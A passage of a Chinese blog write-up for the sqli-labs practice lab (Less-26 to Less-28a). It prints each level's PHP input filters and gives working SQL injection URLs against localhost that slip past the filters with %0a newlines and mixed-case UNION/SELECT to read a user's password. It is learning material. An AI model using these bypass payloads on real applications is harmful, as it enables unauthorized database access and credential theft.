preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br></pre></td></tr></table></figure></p>
+<p>2.看来只能使用替代了，空格的替代为：<code>Blanks=(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0a&#39;)</code><br>3.试了以上替代，都未成功，先放着。</p>
+<hr>
+<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>同<code>Less-26</code>，为单引号加括号闭合。<br>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>1.这次被过滤掉的有：(试到这实在试不下去了，主要是找到替代，为方便观看，直接把源码都贴上了，包括上面几题的也补充了)：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure></p>
+<p>2.构造：<code>http://localhost:8088/sqlilabs/Less-27/?id=0&#39;%0aunIon%0aseLect%0a1,(seLect%0apassword%0afrom%0ausers%0awhere%0aid=1),&#39;3</code></p>
+<hr>
+<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>同<code>Less-27</code>，为双引号闭合。<br><code>http://localhost:8088/sqlilabs/Less-27a/?id=0&quot;%0aunIon%0aseLect%0a1,(seLect%0apassword%0afrom%0ausers%0awhere%0aid=1),&quot;3</code><br>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);	    //Strip out Select</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);					<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure></p>
+<p>为单引号加括号闭合</p>
+<hr>
+<h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[--]/',"", $id);				//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[#]/',"", $id);					//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br></pre></td></tr></table></figure></p>
+<p>为单引号加括号</p>
+<hr>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lei
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://clwsec.top/2019/03/21/sqli-labs-Less21-37/" title="Sqli-Labs-Less21-37">https://clwsec.top/2019/03/21/sqli-labs-Less21-37/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"> <i class="fa fa-tag"></i> sqli-labs</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"> <i class="fa fa-tag"></i> SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/21/Python常用函数总结/" rel="next" title="Python常用函数总结">
+                <i class="fa fa-chevron-left"></i> Python常用函数总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MzA3Ni8xOTYyMg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="lei">
+            
+              <p class="site-author-name" itemprop="name">lei</p>
+              <p class="site-description motion-element" itemprop="description">业精于勤 荒于嬉 行成于思 毁于随</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/clwsec" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="email:clwsec@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/7e18a3f52ba3" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-heartbeat"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="qq:740455490" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.baidu.com/" title="百度" target="_blank">百度</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhihu.com/" title="知乎" target="_blank">知乎</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.runoob.com/" title="菜鸟" target="_blank">菜鸟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.w3school.com.cn/" title="W3school" target="_blank">W3school</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-21"><span class="nav-number">1.</span> <span class="nav-text">Less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-22"><span class="nav-number">2.</span> <span class="nav-text">Less-22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-23"><span class="nav-number">3.</span> <span class="nav-text">Less-23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-24"><span class="nav-number">4.</span> <span class="nav-text">Less-24</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-25"><span class="nav-number">5.</span> <span class="nav-text">Less-25</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用联合查询"><span class="nav-number">5.1.</span> <span class="nav-text">使用联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用替代和报错注入"><span class="nav-number">5.2.</span> <span class="nav-text">使用替代和报错注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-25a"><span class="nav-number">6.</span> <span class="nav-text">Less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-26"><span class="nav-number">7.</span> <span class="nav-text">Less-26</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-26a"><span class="nav-number">8.</span> <span class="nav-text">Less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-27"><span class="nav-number">9.</span> <span class="nav-text">Less-27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-27a"><span class="nav-number">10.</span> <span class="nav-text">Less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-28"><span class="nav-number">11.</span> <span class="nav-text">Less-28</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-28a"><span class="nav-number">12.</span> <span class="nav-text">Less-28a</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lei</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">24.9k</span>
+  
+</div>
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("G6dqnRdCxLa2gzB6qMGY7QCL-gzGzoHsz", "cEc5NtouoT5gS22x2xD9CUnO");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
